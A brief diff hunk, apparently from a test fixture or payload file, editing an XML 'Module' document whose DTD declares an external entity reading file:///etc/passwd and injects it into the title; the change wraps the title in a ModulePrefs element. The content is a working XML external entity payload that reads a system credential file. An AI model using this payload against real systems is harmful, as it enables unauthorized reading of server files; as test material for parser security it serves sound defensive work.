@@ -3,5 +3,7 @@
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <Module>
+<ModulePrefs>
     <title>&xxe;</title>
+</ModulePrefs>
 </Module>
